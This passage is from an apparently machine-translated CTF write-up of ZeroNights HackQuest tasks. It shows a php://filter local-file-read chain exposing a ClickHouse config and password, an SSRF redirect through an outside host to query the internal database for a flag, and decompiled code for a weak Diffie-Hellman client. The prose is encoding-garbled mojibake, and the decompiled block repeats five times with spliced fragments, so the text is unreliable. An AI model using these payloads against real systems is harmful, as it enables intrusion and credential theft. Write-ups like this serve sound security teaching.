hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  рдФрд░ рд░рд┐рд╡рд░реНрд╕ рдСрд░реНрдбрд░ рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдкрдврд╝реЗрдВ: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p>  рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдирд┐рдореНрди рдкреНрд░рдХрд╛рд░ рд╕реЗ ClickHouse рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ: </p><br><pre> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p>  рд▓реЗрдХрд┐рди рдЬрдм рд╕реЗ рд╣рдо рд╢реБрд░реВ рдореЗрдВ POST рднреЗрдЬрддреЗ рд╣реИрдВ, рд╣рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред  рдФрд░ рдЕрдВрддрд┐рдо рдЕрдиреБрд░реЛрдз рдЗрд╕ рддрд░рд╣ рд╕реЗ рдирд┐рдХрд▓рд╛ (рдЗрд╕ рд╕реНрддрд░ рдкрд░ рдореИрдВ рдмрд╣реБрдд рдЧреВрдВрдЧрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЗ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдмрдбрд╝реЗ рдШреЛрдВрд╕рд▓реЗ рдХреЗ рдХрд╛рд░рдг, рдореИрдВрдиреЗ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЛ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛) </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  рдареАрдХ рд╣реИ, рддреЛ рдмрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ: </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2>  рдбреЗ 4. ASR-EHD </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p>  рдЪреМрдереЗ рджрд┐рди рдХрд╛ рдХрд╛рд░реНрдпрднрд╛рд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдбрд┐рдЬрд┐рдЯрд▓ рд╕реБрд░рдХреНрд╖рд╛</a> рдЕрдиреБрд╕рдВрдзрд╛рди рд╡рд┐рднрд╛рдЧ рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред  рдХрд╛рд░реНрдп рдХрд╛ рдореБрдЦреНрдп рдХрд╛рд░реНрдп рдпрд╣ рджрд┐рдЦрд╛рдирд╛ рдерд╛ рдХрд┐ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЗ рд╕реНрд░реЛрдд рдХреА рдЧрд▓рдд рдкрд╕рдВрдж рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдХреИрд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИред  рдЯрд╛рд╕реНрдХ рдореЗрдВ, рдПрд▓рдПрдлрдЖрд░рдЖрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдбреАрдПрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрд╡-рд▓рд┐рдЦрд┐рдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдЬрдирд░реЗрдЯрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред  DH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдореВрд▓реНрдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд░реНрдпрд╛рдкреНрдд kollichestva рд▓рдЧрд╛рддрд╛рд░ рдЯреАрдПрд▓рдПрд╕-рд╣рд╛рде рдорд┐рд▓рд╛рдирд╛ рдкреНрд░рд╛рдкреНрдд LFSR рдХреА рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрд╡рд╕реНрдерд╛ рдХреЛ рдмрд╣рд╛рд▓ рдХрд░рдиреЗ рдФрд░ рдкреВрд░реЗ рдпрд╛рддрд╛рдпрд╛рдд рдХреЛ рдбрд┐рдХреЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдкрд░ред </p><br><div class="spoiler">  <b class="spoiler_title">рдЪреМрдереЗ рджрд┐рди рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдгрдп (AV1ct0r)</b> <div class="spoiler_text"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r">  рджрд┐рди 4 / ASR-EHD - AV1ct0r рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦреЗрдВ </h1><br><p>  рдкреАрдЯрд░ рдереЛрдбрд╝рд╛ рдкрд╛рдЧрд▓ рд╣реИ: рд╡рд╣ рд╣рдореЗрд╢рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВ рдкреАрдЯрд░ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдЙрдиреНрд╣реЛрдВрдиреЗ рд╣рдореЗрдВ рдПрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдбрдВрдк рднреА рджрд┐рдпрд╛, рдЬреЛ рдЙрдирдХреЗ рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред  рдХреНрдпрд╛ рдкреАрдЯрд░ рдХрд╛ рдХрдиреЗрдХреНрд╢рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ? </p><br><p>  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol><li><p>  рдЖрдИрдбреАрдП рдкреНрд░реЛ рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдпрд╣ рдзреНрд╡рдЬ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ рд╕реЗ рдлрд╛рдЗрд▓ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">https://ssltest.a1exdandy.me:443/</a> ред  рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдХреМрди рд╕рд╛ рднрд╛рдЧ (рдХрд┐рд╕ рдмрд╛рдЗрдЯ рд╕реЗ) рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><pre> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> v11)) <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> (__int64) "ssltest.a1exdandy.me:443"); <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> n", 1uLL, 0x11uLL, stderr); <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> \ n", 1uLL, 0x12uLL, stderr); <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p>  рд╕рд░реНрд╡рд░ рдкрд░ рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдХреЛрдИ рдЪрд┐рддреНрд░ рдирд╣реАрдВ рдереЗ, рд▓реЗрдХрд┐рди рдбрдВрдк.рдХреИрдк ssl рдЯреНрд░реИрдлрд╝рд┐рдХ рдХрд╛ рдПрдХ рдЧреБрдЪреНрдЫрд╛ рд╣реИ, рд╕рдВрднрд╡рддрдГ рдЪрд┐рддреНрд░ рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рдеред  рд╣рд╛рд░реНрджрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рдХреА рддреНрд╡рд░рд┐рдд рдЬрд╛рдВрдЪ рдХреЗ рдмрд╛рдж (рдпрд╛рддрд╛рдпрд╛рдд рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП), рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рд╕рд░реНрд╡рд░ рдХрдордЬреЛрд░ рдирд╣реАрдВ рд╣реИред  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, SSL рд╕рддреНрд░реЛрдВ рдореЗрдВ, рдЯреНрд░реИрдлрд╝рд┐рдХ рдбрдВрдк рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░, DHE-RSA-AES128-SHA256 рд╕рд┐рдлрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ RSA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕ рдореЛрдб рдореЗрдВ рдирд┐рдЬреА RSA рд╕рд░реНрд╡рд░ рдХреБрдВрдЬреА рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдбрд┐рдлрд┐-рд╣реЗрд▓рдореИрди рд╕реНрдХреАрдо рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЖрджрд╛рди-рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред )ред </p><br></li><li><p>  рдереЛрдбрд╝рд╛ рд╕рд╛ рдкреЙрдбрдмреАрд░реНрд╕реНрдЯрд┐рд╡ рд╣реЛрдиреЗ рд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ рдлрд╛рдЗрд▓ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">https://ssltest.a1exdandy.me/x</a> рдорд┐рд▓реА, рдЬреЛ 